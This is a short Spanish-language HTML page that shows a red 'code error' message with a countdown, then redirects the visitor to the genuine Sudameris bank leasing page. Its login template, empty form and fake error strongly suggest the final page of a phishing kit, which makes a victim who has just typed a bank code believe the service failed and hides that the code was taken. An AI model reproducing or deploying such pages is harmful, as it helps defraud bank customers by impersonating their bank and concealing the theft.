<!DOCTYPE html>
<html lang="en">
<head>
	<title>home</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="stylesheet" type="text/css" href="util.css">
	<link rel="stylesheet" type="text/css" href="main.css">
 <script language="JavaScript">
	var tiempo=8;
    var url="https://www.sudameris.com.py/Leasing";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Por favor, espera en "+tiempo+" seras redireccionado <br>a la pagina de inicio, intenta mas tarde";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form class="login100-form validate-form" method="post" action="">
					<div align="center">
						
					</div>
					
					
					
					  
  	<div align="center"><img src="err.png" style="width:90px;">
								
								<br><br>
								<span style="font-size:22px;color:red">¡ERROR DE CÓDIGO!</span>
								
								<br><br><br>
								
								
								<font id="contador" style=" font-size:18px;"></font>
								</div>

					<div class="text-center p-t-115">
						<img src="512x512bb.jpg" style="width:100px;">
						

					</div>
				</form>
			</div>
		</div>
	</div>

</body>
</html>